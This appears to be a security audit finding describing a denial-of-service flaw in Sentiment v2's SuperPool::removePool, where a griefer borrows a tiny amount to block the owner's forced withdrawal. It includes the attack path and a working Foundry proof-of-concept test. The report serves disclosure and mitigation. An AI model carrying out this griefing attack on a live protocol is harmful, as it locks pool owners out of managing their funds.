Delightful Gingerbread Goose

Medium

# Malicious user can DoS `SuperPool::removePool(...)`

### Summary

Trying to forcibly withdraw any excess funds when removing an underlying `Pool` from a `SuperPool` could lead to a Denial-of-Service (DoS) attack, as a malicious user can open and borrow the minimum amounts from a position, making it impossible for a pool owner to close the pool. Setting the issue as medium due to the sponsor's comments that they might consider setting the minimum debt and borrow amounts to `0` in future releases, which will make this attack cost nothing for a griefer.

<img width="1102" alt="Screenshot 2024-08-19 at 15 26 56" src="https://github.com/user-attachments/assets/98b30fd2-e432-4db3-9c67-ab4996128bb8">
<img width="1107" alt="Screenshot 2024-08-19 at 15 36 39" src="https://github.com/user-attachments/assets/983ddf16-b2a5-4d2a-96fc-2e735536ab30">


### Root Cause

As described in the [previous audit by Guardian](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/audits/sentiment_v2_guardian.pdf), trying to remove an underlying pool that still has assets in it, will revert. This is why the protocol team has created the ability for an owner to forcibly close it by withdrawing all of the underlying pool's assets into the super pool. However, due to the [liquidity](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/Pool.sol#L362) check in the base pool's withdraw logic, if a pool has deposits and borrows, it won't be fully withdrawable, as remove pool will always try to withdraw all available assets, but if there is a borrow the maximum withdrawable assets will always be less:

```solidity
function withdraw(
        uint256 poolId,
        uint256 assets,
        address receiver,
        address owner
    ) public returns (uint256 shares) {
        PoolData storage pool = poolDataFor[poolId];
__SNIP__
        uint256 maxWithdrawAssets = pool.totalDepositAssets - pool.totalBorrowAssets;

        uint256 totalBalance = IERC20(pool.asset).balanceOf(address(this));
        maxWithdrawAssets = (totalBalance > maxWithdrawAssets) ? maxWithdrawAssets : totalBalance;
@>        if (maxWithdrawAssets < assets) revert Pool_InsufficientWithdrawLiquidity(poolId, maxWithdrawAssets, assets); // maxWithdrawAssets will always be < assets when there is a borrow
__SNIP__
    }
```

 This allows a malicious user to create and borrow the minimum amounts from a position, preventing the pool owner from removing the pool.

### Internal pre-conditions

1. Set `asset1` and `asset2` as known assets (admin actions).
2. Initialize an underlying `Pool` with a specific `RateModel` and `asset1` (pool owner).
3. Set the corresponding oracle for the assets (admin actions).
4. Create a `SuperPool` which uses `asset1` (pool owner).
5. Set an `LTV` for `asset2` used for borrowing (pool owner).
6. Add the underlying pool to the super pool (pool owner).

### External pre-conditions

N/A

### Attack Path

1. The malicious user mints and approves the super pool for 'asset1`.
2. The user directly deposits the amount in the super pool.
3. He/She then mints and approves the position manager for `asset2` (used for borrowing).
4. He/She creates a new position.
5. He/She creates a set of actions - add `asset2` to the position, deposit `asset2` and borrow from the underlying pool.
6. Because of the small amount the position will be healthy and the pool owner won't be able to force withdraw to remove the pool.

### Impact

The super pool owner will not be able to remove the current pool.

### PoC

The test shows the attack with no minimum debt and borrowing amounts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { BaseTest } from "./BaseTest.t.sol";
import {Pool} from "src/Pool.sol";
import {Registry} from "src/Registry.sol";
import {SuperPool} from "src/SuperPool.sol";
import {RiskEngine} from "src/RiskEngine.sol";
import {SuperPoolFactory} from "src/SuperPoolFactory.sol";
import {PositionManager, Action} from "src/PositionManager.sol";
import { FixedPriceOracle } from "src/oracle/FixedPriceOracle.sol";

contract SentimentTests is BaseTest {
    uint256 initialDepositAmt = 1e5;

    Pool pool;
    Registry registry;
    SuperPool superPool;
    RiskEngine riskEngine;
    SuperPoolFactory superPoolFactory;
    PositionManager positionManager;

    address public feeTo = makeAddr("FeeTo");

    function setUp() public override {
        super.setUp();

        pool = protocol.pool();
        registry = protocol.registry();
        riskEngine = protocol.riskEngine();
        superPoolFactory = protocol.superPoolFactory();

        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
        vm.prank(protocolOwner);
        riskEngine.setOracle(address(asset1), address(asset1Oracle));

        vm.prank(protocolOwner);
        asset1.mint(address(this), initialDepositAmt);
        asset1.approve(address(superPoolFactory), initialDepositAmt);

        superPool = SuperPool(
            superPoolFactory.deploySuperPool(
                poolOwner, address(asset1), feeTo, 0.01 ether, 1_000_000 ether, initialDepositAmt, "test", "test"
            )
        );

        vm.startPrank(poolOwner);
        riskEngine.requestLtvUpdate(linearRatePool, address(asset2), 0.75e18);
        riskEngine.acceptLtvUpdate(linearRatePool, address(asset2));
        vm.stopPrank();
    }

    function testDosRemovePool() public {
        positionManager = protocol.positionManager();

        vm.startPrank(poolOwner);
        superPool.addPool(linearRatePool, 50 ether);
        vm.stopPrank();

        vm.startPrank(user2);
        asset1.mint(user2, 2);
        asset1.approve(address(superPool), 2);
        superPool.deposit(2, user2);

        asset2.mint(user2, 2);
        asset2.approve(address(positionManager), 2);

        // Make a new position
        (address position, Action memory _newPosition) = newPosition(user2, "test");
        positionManager.process(position, _newPosition);

        Action memory addNewCollateral2 = addToken(address(asset2));
        Action memory depositCollateral2 = deposit(address(asset2), 2);
        Action memory borrowAct = borrow(linearRatePool, 1);

        Action[] memory actions = new Action[](3);
        actions[0] = addNewCollateral2;
        actions[1] = depositCollateral2;
        actions[2] = borrowAct;

        positionManager.processBatch(position, actions);
        vm.stopPrank();

        vm.startPrank(poolOwner);
        vm.expectRevert(abi.encodeWithSelector(Pool.Pool_InsufficientWithdrawLiquidity.selector, linearRatePool, 1, 2));
        superPool.removePool(linearRatePool, true);
        vm.stopPrank();
    }
}
```

### Mitigation

This issue is not that straightforward to fix, and the protocol team has implemented `minBorrow` and `minDebt` amounts which should make the attack infeasible, but these values should never be set to `0`.